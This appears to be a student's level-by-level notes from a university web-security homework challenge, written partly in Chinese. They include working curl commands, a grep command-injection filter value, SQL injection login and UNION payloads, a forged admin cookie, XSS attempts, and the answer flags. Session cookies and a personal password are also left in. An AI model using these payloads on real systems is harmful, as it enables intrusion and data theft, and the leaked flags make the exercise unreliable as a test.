---------------------------------------------------level01--------------------------------------------------
When I clicked "verify" button, noting happened. So I opened developer tool and see console. It said "Refused to execute script from 'https://hw4.cse545s17.adamdoupe.com/~level01/cgi-bin/verify.js' because its MIME type ('text/html') is not executable, and strict MIME type checking is enabled". At first I tried to search way to disable MIME type checking, so result. Then after I track the network, I found that verify.js is delivered to me. Content of this file shows below:
function verify(form) {
	if ((form.username.value == "script") && (form.password.value == "FLGtzV8xYYX")) {
	  alert("You got it! Now submit the password at the submission site");
        } else {
          alert("Wrong password!");
        }
}
So password should be FLGtzV8xYYX


---------------------------------------------------level02--------------------------------------------------
After reading the javascript, I found that this js tries to send http request with URL "/~level02/cgi-bin/users.php?filter=", by default, there is no parameters. So I thought it can be exploited. I can not find anywhere on webpage to input filter parameter. So I gonna use curl to send request.
In order to send curl request, I obtained cookie from header content on browser. After sending it, I get error related to http_reference. So I added reference which also comes from header content. So my command should be something like below:
curl "https://hw4.cse545s17.adamdoupe.com/~level02/cgi-bin/users.php?filter=" --cookie "webchall=xe7oQi4ZQx; PHPSESSID=rn9dsc2r7d1847qrd5oac9j462; __utma=158548970.1220589816.1478498452.1492319494.1492362237.78; __utmc=158548970; __utmz=158548970.1489623356.51.16.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)" -v -e "https://hw4.cse545s17.adamdoupe.com/~level02/"
The question is what parameter should I give? I tried level02, server response with only level02, so this parameter supposed to select given user as name suggested.
By using tools provided by previous hackers, I found that there a file named "secretuser.txt" in the same directory as php file. So password must be in this file. My parameters should led php file to read secretuser.txt. At first I thought this php file return users of mysqlDB, but it is impossible because if so, there is no way to read secretuser.txt. Thus, it is not a sql injection problem.
The most typical way on linux to filter is by grep command. After searching, I found that by using "grep '' *" command, I can get content of all the files in current directory. In my command I used symbol code, otherwise I will get invalid request error. Final command shows like below:
curl "https://hw4.cse545s17.adamdoupe.com/~level02/cgi-bin/users.php?filter=%27%27%20%2A" --cookie "webchall=xe7oQi4ZQx; PHPSESSID=rn9dsc2r7d1847qrd5oac9j462; __utma=158548970.1220589816.1478498452.1492319494.1492362237.78; __utmc=158548970; __utmz=158548970.1489623356.51.16.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)" -v -e "https://hw4.cse545s17.adamdoupe.com/~level02/"

password:FLGCls7qIiI

curl "https://hw4.cse545s17.adamdoupe.com/~level02/cgi-bin/users.php?filter=%27%27%20%2A" --cookie "__utma=158548970.426547359.1493845771.1493845771.1493845771.1; __utmb=158548970.6.10.1493845771; __utmc=158548970; __utmz=158548970.1493845771.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; webchall=VtXT21J0Tq" -v -e "https://hw4.cse545s17.adamdoupe.com/~level02/"

---------------------------------------------------level03--------------------------------------------------
登陆页面上，用户名随意输一个，password复制粘贴下面这行:  
' OR SUBSTR(password,1,1)='F'--
主页最下面一行会有一个FLG开头的东西。下面这部分不用看了 错的
When I use my username and password, it response that it is invalid username/password. So I think this is SQL injection problem. At first I guess the format of sql query be query = "select * from table where username = '"+username+"' and password = '"+password+"'"; so when I input ' OR '1'='1 to both username and password, the query should be select * from table where username = '' OR '1'='1' and password = ' OR '1'='1' the where clause will always be true. The page direct me to user profile of harry.



level09
tried to use stored XSS attack. In secret message, I used <script>alert("attacked")</script>. When I login, it shows "This message is just for you: <script>alert("attacked")</script>". So my secret message is stored into database and then retrieve from DB. But his script is not execured because it is put into a <p> tag. So I tried to use "</p><script>alert("attacked")</script><p>" as secret to release my script. Unfortunately, still doesn't work.




---------------------------------------------------level05--------------------------------------------------
I tried to use web page to submit form, but it doesn't work because there is no form tag in this page, so submit button don't know where to submit my form. So I used curl to post my form. Using tool provided by professor, I saw that there is a file named admin, I think this is my target file. From index.html, I know that I should submit my form to store.py. So submit url should be "https://hw4.cse545s17.adamdoupe.com/~level05/cgi-bin/store.py". Fortunately, I can read store.py file. I saw that id, site and password are mandatory paremeters and when admin parameter be 1, script will open some file and return content to me. So I tried following command:
C:\Users\Fontaine\Desktop\curl-7.53.1-win64-mingw\bin>
curl -X POST -F "id=1234" -F "site=Fontaine" -F "password=Jiangft1213!" -F "admin=1" https://hw4.cse545s17.adamdoupe.com/~level05/cgi-bin/store.py -v --cookie "__utmt=1; __utma=158548970.1220589816.1478498452.1492362237.1492459981.79; __utmb=158548970.4.10.1492459981; __utmc=158548970; __utmz=158548970.1489623356.51.16.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); webchall=xe7oQi4ZQx;"
It give me an internal server error.
After carefully reading the code, I found that this script read cookie given by user and if there is a cookie named "user", it will open and read a file named by the cookie value. So I faked a cookie: user=admin and try above command again. It works.
Password: FLGpHMfzw4i

curl -X POST -F "id=1234" -F "site=Fontaine" -F "password=Jiangft1213!" -F "admin=1" https://hw4.cse545s17.adamdoupe.com/~level05/cgi-bin/store.py -v --cookie "__utma=158548970.426547359.1493845771.1493845771.1493845771.1; __utmb=158548970.6.10.1493845771; __utmc=158548970; __utmz=158548970.1493845771.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; webchall=VtXT21J0Tq; user=admin"



---------------------------------------------------level06--------------------------------------------------
C:\Users\Fontaine\Desktop\curl-7.53.1-win64-mingw\bin>
curl -A "s3cr37.pwd" "https://hw4.cse545s17.adamdoupe.com/~level06/cgi-bin/index.php" --cookie "webchall=xe7oQi4ZQx; __utmt=1; __utma=158548970.1220589816.1478498452.1492459981.1492463609.80; __utmb=158548970.3.10.1492463609; __utmc=158548970; __utmz=158548970.1489623356.51.16.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)"

curl -A "s3cr37.pwd" "https://hw4.cse545s17.adamdoupe.com/~level06/cgi-bin/index.php" --cookie "__utma=158548970.426547359.1493845771.1493845771.1493845771.1; __utmb=158548970.6.10.1493845771; __utmc=158548970; __utmz=158548970.1493845771.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; webchall=VtXT21J0Tq"



---------------------------------------------------level07--------------------------------------------------
xss protection enabled. xss-protection:1;mode=block


 level08
注册页面，其他四项随便填，username项填写：
admin' UNION SELECT password, password, password, password, password, password FROM users WHERE username='admin

---------------------------------------------------level10
--------------------------------------------------
从level10的页面查看源，有个parameter叫msg，复制下来。
把下面这个java程序跑一遍，main方法的那个String的内容换成你自己的msg
package fuckingadam;

import java.util.HashMap;

public class Fuckadam {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		System.out.println(decrString("FKIVoHU2b9L"));
	}
	
	public static String decrString(String paramString)
	  {
	    char[] arrayOfChar1 = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
	    HashMap localHashMap = new HashMap(arrayOfChar1.length);

	    for (int i = 0; i < arrayOfChar1.length; ++i)
	    {
	      localHashMap.put(Character.valueOf(arrayOfChar1[i]), Integer.valueOf(i));
	    }

	    char[] arrayOfChar2 = new char[paramString.length()];
	    for (int j = 0; j < paramString.length(); ++j)
	    {
	      int k = ((Integer)localHashMap.get(Character.valueOf(paramString.charAt(j)))).intValue();
	      if (j % 2 == 0)
	      {
	        int l = (k - j) % arrayOfChar1.length;
	        if (l < 0)
	        {
	          l += arrayOfChar1.length;
	        }
	        arrayOfChar2[j] = arrayOfChar1[l];
	      }
	      else
	      {
	        arrayOfChar2[j] = arrayOfChar1[((k + j) % arrayOfChar1.length)];
	      }
	    }

	    String str = new String(arrayOfChar2);
	    return str;
	  }

}
